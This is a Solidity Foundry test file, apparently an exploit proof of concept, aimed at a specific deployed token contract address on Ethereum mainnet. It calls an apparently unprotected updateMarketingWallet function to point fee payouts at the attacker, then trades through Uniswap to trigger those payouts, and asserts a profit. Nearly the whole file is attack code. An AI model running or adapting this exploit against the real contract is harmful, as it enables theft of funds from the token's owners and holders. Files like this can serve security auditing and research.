// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ITarget {
    function owner() external view returns (address);
    function enableTrading() external;
    function updateMarketingWallet(address) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Router() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get some initial ETH for trading
        deal(attacker, 100 ether);

        // Get some tokens to start with - we'll need to buy from Uniswap
        // First, get WETH and approve router
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        deal(weth, attacker, 100 ether);
        IERC20(weth).approve(ITarget(TARGET).uniswapV2Router(), type(uint256).max);

        // Also approve token transfers
        ITarget(TARGET).approve(ITarget(TARGET).uniswapV2Router(), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));

        // Step 1: Impersonate owner to enable trading (required precondition)
        address owner = ITarget(TARGET).owner();
        vm.startPrank(owner);
        ITarget(TARGET).enableTrading();
        vm.stopPrank();

        // Step 2: Exploit the unprotected function - set marketing wallet to attacker
        // This should work without impersonation if function is truly unprotected
        ITarget(TARGET).updateMarketingWallet(attacker);

        // Step 3: Buy tokens to generate fees that accumulate in contract
        // We need to swap WETH for tokens via the Uniswap pair
        address routerAddress = ITarget(TARGET).uniswapV2Router();
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(TARGET);

        // Make a buy transaction to generate fees
        uint256 amountIn = 10 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 4: Sell some tokens to generate more fees and potentially trigger swapBack
        uint256 tokenBalance = ITarget(TARGET).balanceOf(attacker);
        if (tokenBalance > 0) {
            // Approve router to spend tokens
            ITarget(TARGET).approve(routerAddress, tokenBalance);

            // Swap tokens back to ETH
            address[] memory sellPath = new address[](2);
            sellPath[0] = address(TARGET);
            sellPath[1] = router.WETH();

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenBalance / 2, // Sell half
                0,
                sellPath,
                attacker,
                block.timestamp
            );
        }

        // The swapBack() should have been triggered during the sell transaction
        // Marketing fees in ETH should have been sent to attacker address
        // Check attacker's ETH balance increased
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
